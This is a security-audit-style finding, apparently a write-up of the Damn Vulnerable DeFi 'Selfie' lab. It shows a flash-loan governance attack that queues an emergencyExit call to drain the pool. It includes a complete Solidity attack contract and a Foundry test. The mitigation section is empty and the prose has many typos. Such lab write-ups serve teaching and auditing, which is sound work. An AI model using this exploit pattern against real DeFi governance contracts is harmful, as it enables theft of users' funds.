## Critical Severity Issues

### [C-1] `SelfiePool` Flash Loan Lead to Governance Attack

**Description:** The `SelfiePool` protocol allows users to take flash loan as much as they can.But the attacker use that flash loan attain the governance power and queue the propsal of `emergencyExit` function call via signature.After two days of interval attacker execute his attack and darin the entire protocol funds.

```javascript
function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data) external nonReentrant returns (bool) {
        if (_token != address(token)) {
            revert UnsupportedCurrency();
        }
        token.transfer(address(_receiver), _amount);

        if (
            _receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) !=
            CALLBACK_SUCCESS
        ) {
            revert CallbackFailed();
        }

        if (!token.transferFrom(address(_receiver), address(this), _amount)) {
            revert RepayFailed();
        }

        return true;
    }
```

**Impact:** An attacker leverage the governance power, queue and execute pool tokens withdrwal for his self.

Attack Contract:

```javascript
contract Attack is IERC3156FlashBorrower {
    SimpleGovernance simpleGovernance;
    DamnValuableVotes dvt;
    SelfiePool pool;

    uint256 public actionId;

    constructor( SimpleGovernance _simpleGovernance, DamnValuableVotes _token, SelfiePool _pool) {
        simpleGovernance = _simpleGovernance;
        dvt = _token;
        pool = _pool;
    }

    function onFlashLoan( address initiator, address token, uint256 amount, uint256 fee, bytes calldata data
    ) external returns (bytes32) {
        // get voting power
        dvt.delegate(address(this));

        actionId = simpleGovernance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", address(this))
        );

        dvt.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function execute() external {
        simpleGovernance.executeAction(actionId);
    }

    fallback() external payable {}
}

```

**Proof of Concept:**

1. Attacker call take flashloan
2. leaverage that flash loan and get voting power.
3. execute the propsal of EmergencyExit.
4. After two days darin the entire protocol tokens.

**Proof of Code:**

```javascript
function testAttack() public {
        // Activate voting power
        vm.startPrank(address(target));
        pool.flashLoan(
            IERC3156FlashBorrower(target),
            address(dvtVotes),
            dvtVotes.balanceOf(address(pool)),
            ""
        );

        vm.warp(block.timestamp + 2 days);
        target.execute();
        vm.stopPrank();
    }
```

**Recommended Mitigation:**
